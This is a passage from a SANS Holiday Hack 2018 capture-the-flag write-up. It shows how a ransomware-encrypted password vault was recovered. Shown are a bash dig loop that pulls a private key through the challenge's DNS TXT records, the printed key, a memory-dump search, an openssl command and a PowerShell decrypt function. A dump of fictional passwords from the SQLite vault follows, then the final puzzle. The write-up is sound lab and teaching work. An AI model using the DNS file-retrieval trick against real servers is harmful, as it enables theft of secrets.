CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5
ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC
QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB
hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi
zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb
E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+
kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw
DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G
2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH
QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
+w==

[DBG]: PS C:\Users\IEUser>>
```

I was stuck on the private key for awhile. Then, after reviewing my notes, I saw this hint from Shinny Upatree: "Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need." If left as the default, the name of the private key would be "server.key". I built my own <code>g_o_dns</code> function using bash:

```
$ for i in {0..13}; do dig -t txt $i.7365727665722e6b6579.erohetfanu.com @erohetfanu.com; done | grep TXT > ~/Downloads/dnscat.txt
$ egrep -v ";" ~/Downloads/dnscat.txt | awk '{print $5}'
```

That worked! Hex encoding <code>server.key</code> allowed me to grab the file through DNS TXT records. I dropped the output into CyberChef (it handles the quotes) and now I had the private key:

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
```

Next, I aimed at finding the encrypted symmetric key. I quickly verified the length of the key in ISE by setting a breakpoint and printing the length of p_k_e_k:

```powershell
[DBG]: PS C:\Users\IEUser>> $p_k_e_k.length
512
```

It is worth noting that this key is randomly generated, the key running in my VM cannot be used to decrypt Alabasters. I simply used it to verify the length before searching through the memory dump with PowerDump (LOL): 

```
: len == 512

================ Filters ================
1| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
Variable Values #1 above ^
```

Only one variable with that length, that must be the key. Next, I generated a PFX certificate using the servers public and private key using *openssl*: 

```
openssl pkcs12 -export -out out.pfx -inkey server.key -in server.crt
```

I imported the PFX cert in Windows using MMC.

That is everything I needed. Finally, I wrote a new function called decrypt, re-using a few of the functions from wannacookie. I included the code below, with just what I added to save some space:

```powershell
function decrypt{
$mycert = Get-Item "Cert:\CurrentUser\My\B1D1E73DCBFFBD458B341A6E8AED3549A81077D6";
$foo = "3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971";
$out = H2B($foo);
[array]$f_c = $(Get-ChildItem -Path C:\Users\IEUser\Desktop\forensic_artifacts\ -Recurse | Foreach-Object {$_.Fullname})
$bar = $mycert.PrivateKey.Decrypt($out, $true);
e_n_d $bar $f_c $false;
}
```

I ran the decrypt function and the decrypted vault appeared in the directory. I issued the *file* command to see what type of file it was. It was a sqlite DB so I used sqlite3 to dump the passwords:

```
$ file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
$ sqlite3 alabaster_passwords.elfdb
SQLite version 3.16.0 2016-11-04 19:09:39
Enter ".help" for usage hints.
sqlite> .tables
passwords
sqlite> SELECT * from passwords;
alabaster.snowball|CookiesR0cK!2!#|active directory
alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com
alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com
alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner
alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com
alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com
alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org
alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com

```

The password for Alabaster's vault is **ED#ED#EED#EF#G#F#G#ABA#BA#B**. After giving Alabaster his decrypted DB, he said, "I’m seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password?"


### Objective 10: Who Is behind it All?

**Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan.**

This is the final objective and to solve it, we have to unlock the piano lock. I confidently accessed the lock and entered the piano key password from Alabaster's password vault. I was met with a message specifying, "Now that's a good tune! But the key isn't quite right...". A new hint from Alabaster Snowball appeared: "Really, it's Mozart. And it should be in the key of D, not E." 

Interesting. I dug up the PDF that Holly Evergreen had sent Alabaster during the Packalyzer challenge. The PDF had referenced *transposition*, which I used to convert the password. 

The final password translated to - **DC#DC#DDC#DEF#EF#GAG#AG#A**. Using this, we play the piano lock and open the final door to reveal...

<img src="/images/sans_2018/final-plan.png"/>

**Santa** was behind the whole KringleCon plan. Han and the Toy Soldiers (undercover Elves) work for him. The entire scenario was a test to find security professionals with skills across the various infosec domains to help defend the operation next year from any nefarious actors!


## Conclusion

Another great SANS Holiday Hack in the books! I loved the diversity of the challenges this year, which provided me with the opportunity to practice a number of different skills including pentesting, incident response, network forensics, malware analysis, and many more. As always, thank you to Ed Skoudis and the CounterHack team for putting it together.

Looking forward to Holiday Hack 2019!

Mike

